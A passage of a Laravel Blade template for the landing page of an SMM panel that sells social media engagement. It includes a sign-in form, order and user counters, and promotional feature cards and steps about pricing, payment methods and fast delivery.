                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <div class="form-group">
                                                            <div class="component_button_submit">
                                                                <div class="">
                                                                    <button class="btn btn-block btn-big-primary"
                                                                        type="submit" data-lang="auth.sign_in">
                                                                        {{ __('auth.sign_in') }}
                                                                    </button>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    @if(!empty($settings['google_client_id']))
                                                    <div class="form-group">
                                                        <div id="g_id_onload"
                                                            data-client_id="{{ $settings['google_client_id'] }}"
                                                            data-login_uri="{{ url('/confirm_signup') }}"
                                                            data-auto_prompt="false">
                                                        </div>
                                                        <div class="g_id_signin" data-type="standard" data-size="large"
                                                            data-theme="outline" data-text="sign_in_with"
                                                            data-shape="rectangular" data-logo_alignment="left">
                                                        </div>
                                                    </div>
                                                    @endif

                                                    <div class="text-center d-flex justify-content-center">
                                                        <div data-lang="auth.no_account">{{ __('auth.no_account') }}</div>
                                                        <a href="{{ route('signup') }}" class="block-signin-text__sign-up-link" data-lang="auth.sign_up">{{ __('auth.sign_up') }}</a>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-7">
                                    <div class="block-signin__image">
                                        <img src="https://storage.perfectcdn.com/hx1lyd/2s326qtol3g2qft6.webp" alt=""
                                            title="" class="img-fluid">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_135">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="totals ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                padding-top: 24px;                                  padding-bottom: 24px;                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="totals-card h-100 w-100">
                                                    <div class="totals-card__count">
                                                        <h2 class="totals-card__count-value style-text-primary"
                                                            style="">
                                                            5405
                                                        </h2>
                                                    </div>
                                                    <div class="totals-card__name">
                                                        <p>Total services</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                padding-top: 24px;                                  padding-bottom: 24px;                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="totals-card h-100 w-100">
                                                    <div class="totals-card__count">
                                                        <h2 class="totals-card__count-value style-text-primary"
                                                            style="">
                                                            7925696
                                                        </h2>
                                                    </div>
                                                    <div class="totals-card__name">
                                                        <p>Total orders</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                padding-top: 24px;                                  padding-bottom: 24px;                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="totals-card h-100 w-100">
                                                    <div class="totals-card__count">
                                                        <h2 class="totals-card__count-value style-text-primary"
                                                            style="">
                                                            5752
                                                        </h2>
                                                    </div>
                                                    <div class="totals-card__name">
                                                        <p>Total users</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                padding-top: 24px;                                  padding-bottom: 24px;                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="totals-card h-100 w-100">
                                                    <div class="totals-card__count">
                                                        <h2 class="totals-card__count-value style-text-primary"
                                                            style="">
                                                            7184922
                                                        </h2>
                                                    </div>
                                                    <div class="totals-card__name">
                                                        <p>Total completed orders</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_94">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="text-align: CENTER">Why 4,600+ Users Trust
                                                {{ $settings['site_name'] ?? config('app.name') }} Worldwide</span></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center">5,000+ services. 6M+ orders delivered. Real results — no
                                            fluff, no fake.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_96">
                    <div class="block-bg"></div>
                    <div class="block-divider-bottom">
                        <svg width="100%" height="100%" viewBox="0 0 1280 192" preserveAspectRatio="none"
                            xmlns="http://www.w3.org/2000/svg">
                            <path fill="currentColor"
                                d="M0 192.001h1280V74.773c-32.75-29.828-108.74-12.681-217.65 11.89-103.076 23.259-235.641 53.17-388.921 56.193-160.056 3.158-316.559-30.774-442.493-58.078C129.327 62.748 47.618 45.033 0 54.595v137.406Z">
                            </path>
                            <path fill="currentColor" opacity=".22"
                                d="M0 190.283h1280V31.019c-32.75-40.524-108.74-17.229-217.65 16.154-103.077 31.6-235.641 72.236-388.921 76.344-160.056 4.289-316.559-41.81-442.493-78.905C129.327 14.682 47.618-9.385 0 3.605v186.678Z">
                            </path>
                        </svg>
                    </div>
                    <div class="container">
                        <div class="features-block-images ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                      background: var(--color-id-49);                                  color: var(--text-dark);                                                                                                  padding-top: 24px;                                  padding-bottom: 24px;                                  padding-left: 24px;                                  padding-right: 24px;                                                                                                                                                                                                                                                                                                  box-shadow: none;                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 9px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/zjw7drxl7pb4swsx.png"
                                                                alt="SMM panel services" title="{{ $settings['site_name'] ?? config('app.name') }} Services"
                                                                class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p class="text-center"><span style="text-align: CENTER"><span
                                                                    style="font-size: 24px"><strong
                                                                        style="font-weight: bold">5,000+ Real Services.
                                                                        Zero Fake Promises</strong></span></span></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p class="text-center"><span style="text-align: CENTER">As a
                                                                    trusted SMM service provider, we deliver genuine
                                                                    engagement and sustainable growth across all major
                                                                    platforms. Earning the trust of marketers
                                                                    worldwide.</span></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                      padding-top: 24px;                                  padding-bottom: 24px;                                  padding-left: 24px;                                  padding-right: 24px;                                                                                                                                                                  border-left-width: 1px;                                  border-right-width: 1px;                                  border-bottom-width: 1px;                                  border-top-width: 1px;                                  box-shadow: none;                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 10px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/bpglwuti8nm1jsy7.png"
                                                                alt="Secure SMM panel payment methods"
                                                                title="{{ $settings['site_name'] ?? config('app.name') }} Payments" class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p class="text-center"><span style="font-size: 24px"><strong
                                                                    style="font-weight: bold">Pay Your Way — Crypto,
                                                                    Card &amp; More. Always Secure</strong></span></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p class="text-center"><span style="text-align: CENTER">Pay
                                                                    with PayPal, credit card, bank transfer, Wise,
                                                                    Revolut, crypto (USDT, Bitcoin), and more. Every
                                                                    payment is secure, fast, and hassle-free</span></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                      padding-top: 24px;                                  padding-bottom: 24px;                                  padding-left: 24px;                                  padding-right: 24px;                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 10px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/4xkrlxj5ulrhtxbp.png"
                                                                alt="World's cheapest SMM panel prices"
                                                                title="{{ $settings['site_name'] ?? config('app.name') }} Pricing" class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p class="text-center"><span style="font-size: 24px"><strong
                                                                    style="font-weight: bold">World's Cheapest SMM Panel
                                                                    Starting From $0.001/1K</strong></span></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p class="text-center"><span style="text-align: CENTER">The
                                                                    lowest SMM prices on the market. Real quality, zero
                                                                    compromise. Affordable growth for everyone.</span>
                                                            </p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                      padding-top: 24px;                                  padding-bottom: 24px;                                  padding-left: 24px;                                  padding-right: 24px;                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 10px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/8buome0b6fzkmebo.png"
                                                                alt="{{ $settings['site_name'] ?? config('app.name') }} Fast Delivery"
                                                                title="Fast SMM panel order delivery" class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p class="text-center"><span style="text-align: CENTER"><span
                                                                    style="font-size: 24px"><span
                                                                        style="line-height: 32px"><strong
                                                                            style="font-weight: bold">Orders Live in
                                                                            Seconds. Results You Can Track in Real
                                                                            Time</strong></span></span></span></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p class="text-center"><span style="text-align: CENTER">Your
                                                                    orders begin almost instantly and are completed in
                                                                    record time, delivering fast, seamless, and reliable
                                                                    results every time at our fast SMM panel .</span>
                                                            </p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_92">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="font-size: 34px">4 Simple Steps to Boost
                                                Your Social Media Success 🌟</span></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center"><span style="text-align: CENTER">From signing up to
                                                seeing real results — it only takes minutes to unlock your full growth
                                                potential.</span></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_95">
                    <div class="block-bg">
                        <div class="bg-image"></div>
                    </div>
                    <div class="block-divider-bottom">
                        <svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
                            <pattern id="divider-block-95-bottom" patternUnits="userSpaceOnUse" width="800" height="350"
                                x="40">
                                <g>
                                    <path fill="currentColor" fill-opacity=".2" fill-rule="evenodd"
                                        d="M360 80c22.091 0 40-17.909 40-40S382.091 0 360 0s-40 17.909-40 40 17.909 40 40 40Zm-1.623-26.647-10.588-10.018A8.94 8.94 0 0 1 345 36.833v-.344c0-4.151 2.959-7.69 6.996-8.373a8.307 8.307 0 0 1 7.301 2.37l.703.712.703-.713a8.307 8.307 0 0 1 7.301-2.37c4.037.684 6.996 4.223 6.996 8.374v.344a8.94 8.94 0 0 1-2.789 6.502l-10.588 10.018a2.36 2.36 0 0 1-3.246 0ZM240 120c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502ZM640 120c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502ZM840 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm-1.623-26.647-10.588-10.018a8.94 8.94 0 0 1-2.789-6.502v-.345c0-4.15 2.959-7.689 6.996-8.372a8.305 8.305 0 0 1 7.301 2.369l.703.713.703-.713a8.305 8.305 0 0 1 7.301-2.369c4.037.683 6.996 4.222 6.996 8.372v.345a8.94 8.94 0 0 1-2.789 6.502l-10.588 10.018a2.362 2.362 0 0 1-3.246 0Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor" fill-opacity=".2"
                                        d="M680 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Z">
                                    </path>
                                    <path fill="currentColor" fill-opacity=".2" fill-rule="evenodd"
                                        d="M360 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm-1.623-26.647-10.588-10.018a8.94 8.94 0 0 1-2.789-6.502v-.345c0-4.15 2.959-7.689 6.996-8.372a8.305 8.305 0 0 1 7.301 2.369l.703.713.703-.713a8.305 8.305 0 0 1 7.301-2.369c4.037.683 6.996 4.222 6.996 8.372v.345a8.94 8.94 0 0 1-2.789 6.502l-10.588 10.018a2.362 2.362 0 0 1-3.246 0Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor" fill-opacity=".2"
                                        d="M120 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Z">
                                    </path>
                                    <path fill="currentColor" fill-opacity=".2" fill-rule="evenodd"
                                        d="M720 40c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.36 2.36 0 0 0 3.246 0l10.588-10.018A8.94 8.94 0 0 0 695 36.833v-.344c0-4.151-2.959-7.69-6.996-8.373a8.307 8.307 0 0 0-7.301 2.37l-.703.712-.703-.713a8.307 8.307 0 0 0-7.301-2.37C667.959 28.8 665 32.339 665 36.49v.344a8.94 8.94 0 0 0 2.789 6.502Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor" fill-rule="evenodd"
                                        d="M800 117c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor"
                                        d="M40 160c22.091 0 40-17.909 40-40 0 22.091 17.909 40 40 40s40-17.909 40-40-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40S0 97.909 0 120s17.909 40 40 40Zm0 80c-22.091 0-40-17.909-40-40s17.909-40 40-40 40 17.909 40 40-17.909 40-40 40Zm40 40c0 22.091-17.909 40-40 40S0 302.091 0 280s17.909-40 40-40 40 17.909 40 40Zm80 0c0-22.091-17.909-40-40-40s-40 17.909-40 40 17.909 40 40 40 40-17.909 40-40Z">
                                    </path>
                                    <path fill="currentColor" fill-rule="evenodd"
                                        d="M200 240c-22.091 0-40 17.909-40 40s17.909 40 40 40 40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40c-22.091 0-40 17.909-40 40 0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40 17.909 40 40 40 40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40-22.091 0-40 17.909-40 40s17.909 40 40 40c-22.091 0-40 17.909-40 40 0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40 17.909 40 40 40Zm0 0c22.091 0 40 17.909 40 40 0-22.091 17.909-40 40-40-22.091 0-40-17.909-40-40 0 22.091-17.909 40-40 40Zm320 0c22.091 0 40-17.909 40-40 0 22.091 17.909 40 40 40-22.091 0-40 17.909-40 40 0-22.091-17.909-40-40-40Zm-332.211-36.665 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Zm240-80 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Zm80 80 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor"
                                        d="M680 160c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm280-43c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-40 120c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm0 0c-22.091 0-40 17.909-40 40s17.909 40 40 40 40-17.909 40-40-17.909-40-40-40Z">
                                    </path>
                                </g>
                            </pattern>
                            <rect width="100%" height="100%" fill="url(#divider-block-95-bottom)"></rect>
                        </svg>
                    </div>
                    <div class="container">
                        <div class="how-it-works ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 15px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed how-it-works-row">
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card how-it-works-col"
                                        style="
                 background: none;                                              color: inherit; 											 border-color: none; 																																																																																																			 border-left-width: NaNpx; 											 border-right-width: NaNpx; 											 border-bottom-width: NaNpx; 											 border-top-width: NaNpx; 											 box-shadow: none; 											 border-style: none; ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="how-it-works-card">
                                                    <div class="how-it-works-card__icon">
                                                        <span class=" how-it-works-card__icon-wrap"
                                                            style="
                                                 height: 80px;                                                 	 width: 80px; 																																																																														                                                        ">
                                                            <span
                                                                class=" how-it-works-card__icon-fa fad fa-check-double"
                                                                style="
                                                            font-size: 59px;
                                                            width: 59px;
                                                            height: 59px;
                                                            transform: rotate(0deg);
                                                            color: var(--color-id-49);
                                                            text-shadow: 0px 0px 0px rgba(0, 0, 0, 1);
                                                            border-radius: 0px;
                                                            background: transparent;
                                                            padding: 0px;
                                                            "></span>
                                                        </span>
                                                    </div>
                                                    <div class="d-flex justify-content-center how-it-works-preview">
                                                        <div class="how-it-works-arrow-top"></div>
                                                        <div class="how-it-works-number style-box-shadow-default style-bg-light style-border-radius-50 style-card-number"
                                                            style="
                                          width: 80px; 															 height: 80px; 															 background: none; 															 border-color: none; 															 border-top-left-radius: 48px; 															 border-bottom-left-radius: 48px; 															 border-top-right-radius: 48px; 															 border-bottom-right-radius: 48px; 																																																																																																									 font-size: 40px; 															 color: inherit; ">
                                                            1
                                                        </div>
                                                    </div>
                                                    <div class="how-it-works-title"
                                                        style="margin-bottom: 8px; padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center"><span style="text-align: CENTER"><span
                                                                    style="font-size: 24px"><span
                                                                        style="line-height: 32px"><strong
                                                                            style="font-weight: bold">Register &amp; Log
                                                                            in</strong></span></span></span></p>
                                                    </div>
                                                    <div class="how-it-works-description"
                                                        style="padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center">Create your free account in just seconds
                                                            and get instant access to your personal dashboard. It’s
                                                            quick, simple, and completely secure.</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card how-it-works-col"
                                        style="
                 background: none;                                              color: inherit; 											 border-color: none; 																																																																																																			 border-left-width: NaNpx; 											 border-right-width: NaNpx; 											 border-bottom-width: NaNpx; 											 border-top-width: NaNpx; 											 box-shadow: none; 											 border-style: none; ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="how-it-works-card">
                                                    <div class="how-it-works-card__icon">
                                                        <span class=" how-it-works-card__icon-wrap"
                                                            style="
                                                 height: 80px;                                                 	 width: 80px; 																																																																														                                                        ">
                                                            <span class=" how-it-works-card__icon-fa fad fa-box-check"
                                                                style="
                                                            font-size: 56px;
                                                            width: 56px;
                                                            height: 56px;
                                                            transform: rotate(0deg);
                                                            color: var(--color-id-49);
                                                            text-shadow: 0px 0px 0px rgba(0, 0, 0, 1);
                                                            border-radius: 0px;
                                                            background: transparent;
                                                            padding: 0px;
                                                            "></span>
                                                        </span>
                                                    </div>
                                                    <div class="d-flex justify-content-center how-it-works-preview">
                                                        <div class="how-it-works-arrow-top"></div>
                                                        <div class="how-it-works-number style-box-shadow-default style-bg-light style-border-radius-50 style-card-number"
                                                            style="
                                          width: 80px; 															 height: 80px; 															 background: none; 																														 border-top-left-radius: 48px; 															 border-bottom-left-radius: 48px; 															 border-top-right-radius: 48px; 															 border-bottom-right-radius: 48px; 																																																																																																									 font-size: 40px; 															 color: inherit; ">
                                                            2
                                                        </div>
                                                    </div>
                                                    <div class="how-it-works-title"
                                                        style="margin-bottom: 8px; padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center"><span style="text-align: CENTER"><span
                                                                    style="font-size: 24px"><span
                                                                        style="line-height: 32px"><strong
                                                                            style="font-weight: bold">Add
                                                                            Funds</strong></span></span></span></p>
                                                    </div>
                                                    <div class="how-it-works-description"
                                                        style="padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center">Select your preferred payment method and
                                                            top up your balance with ease. We support cards, crypto, and
                                                            more to keep things convenient for you. 💳</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card how-it-works-col"
                                        style="
                 background: none;                                              color: inherit; 											 border-color: none; 																																																																																																			 border-left-width: NaNpx; 											 border-right-width: NaNpx; 											 border-bottom-width: NaNpx; 											 border-top-width: NaNpx; 											 box-shadow: none; 											 border-style: none; ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="how-it-works-card">
                                                    <div class="how-it-works-card__icon">
                                                        <span class=" how-it-works-card__icon-wrap"
                                                            style="
                                                 height: 80px;                                                 	 width: 80px; 																																																																														                                                        ">
                                                            <span class=" how-it-works-card__icon-fa fad fa-dollar-sign"
                                                                style="
                                                            font-size: 56px;
                                                            width: 56px;
                                                            height: 56px;
                                                            transform: rotate(0deg);
                                                            color: var(--color-id-49);
                                                            text-shadow: 0px 0px 0px rgba(0, 0, 0, 1);
                                                            border-radius: 0px;
                                                            background: transparent;
                                                            padding: 0px;
                                                            "></span>
                                                        </span>
                                                    </div>
                                                    <div class="d-flex justify-content-center how-it-works-preview">
                                                        <div class="how-it-works-arrow-top"></div>
                                                        <div class="how-it-works-number style-box-shadow-default style-bg-light style-border-radius-50 style-card-number"
                                                            style="
                                          width: 80px; 															 height: 80px; 															 background: none; 																														 border-top-left-radius: 48px; 															 border-bottom-left-radius: 48px; 															 border-top-right-radius: 48px; 															 border-bottom-right-radius: 48px; 																																																																																																									 font-size: 40px; 															 color: inherit; ">
                                                            3
                                                        </div>
                                                    </div>
                                                    <div class="how-it-works-title"
                                                        style="margin-bottom: 8px; padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center"><span style="text-align: CENTER"><span
                                                                    style="font-size: 24px"><span
                                                                        style="line-height: 32px"><strong
                                                                            style="font-weight: bold">Place Your
                                                                            Orders</strong></span></span></span></p>
                                                    </div>
                                                    <div class="how-it-works-description"
                                                        style="padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center">Choose from thousands of real,
                                                            high-quality services and start boosting your social media
                                                            instantly. 🚀</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card how-it-works-col"
                                        style="
                 background: none;                                              color: inherit; 											 border-color: none; 																																																																																																			 border-left-width: NaNpx; 											 border-right-width: NaNpx; 											 border-bottom-width: NaNpx; 											 border-top-width: NaNpx; 											 box-shadow: none; 											 border-style: none; ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="how-it-works-card">
                                                    <div class="how-it-works-card__icon">
                                                        <span class=" how-it-works-card__icon-wrap"
                                                            style="
                                                 height: 80px;                                                 	 width: 80px; 																																																																														                                                        ">
                                                            <span class=" how-it-works-card__icon-fa fad fa-usd-circle"
                                                                style="
                                                            font-size: 56px;
                                                            width: 56px;
                                                            height: 56px;
                                                            transform: rotate(0deg);
                                                            color: var(--color-id-49);
                                                            text-shadow: 0px 0px 0px rgba(0, 0, 0, 1);
                                                            border-radius: 0px;
                                                            background: transparent;
                                                            padding: 0px;
                                                            "></span>
                                                        </span>
                                                    </div>
                                                    <div class="d-flex justify-content-center how-it-works-preview">
                                                        <div class="how-it-works-arrow-top"></div>
                                                        <div class="how-it-works-number style-box-shadow-default style-bg-light style-border-radius-50 style-card-number"
                                                            style="
                                          width: 80px; 															 height: 80px; 															 background: none; 															 border-color: none; 															 border-top-left-radius: 48px; 															 border-bottom-left-radius: 48px; 															 border-top-right-radius: 48px; 															 border-bottom-right-radius: 48px; 																																																																																																									 font-size: 40px; 															 color: inherit; ">
                                                            4
                                                        </div>
                                                    </div>
                                                    <div class="how-it-works-title"
                                                        style="margin-bottom: 8px; padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center"><span style="text-align: CENTER"><span
                                                                    style="font-size: 24px"><span
                                                                        style="line-height: 32px"><strong
                                                                            style="font-weight: bold">See Real
                                                                            Results</strong></span></span></span></p>
                                                    </div>
                                                    <div class="how-it-works-description"
                                                        style="padding-left: 0px; padding-right: 0x;">
                                                        <p class="text-center"><span style="text-align: CENTER"><strong
